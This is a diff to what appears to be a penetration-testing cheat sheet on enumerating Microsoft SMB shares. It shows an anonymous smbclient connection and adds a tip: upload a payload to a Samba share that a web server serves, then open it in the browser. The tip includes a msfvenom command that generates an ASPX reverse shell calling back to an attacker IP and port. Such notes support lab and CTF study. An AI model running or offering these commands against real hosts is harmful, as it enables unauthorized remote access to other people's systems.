@@ -97,7 +97,11 @@ Enumeration commands for Microsoft SMB service;
  *ITDEPT name of share
                 
     smbclient --no-pass //192.168.236.11/ITDEPT
-   
+  ### Trick in  samba services 
+  *there maybe a port that run in the browser as samba service, So upload payload in samba and run in browser to get shell
+  * Example windows gennerate payload with msfvenom
+        
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.152.52  LPORT=4444 — platform windows -a x64 -f aspx -o shell2.aspx
  
 ### Metasploit Modules for Microsoft SMB service;
 
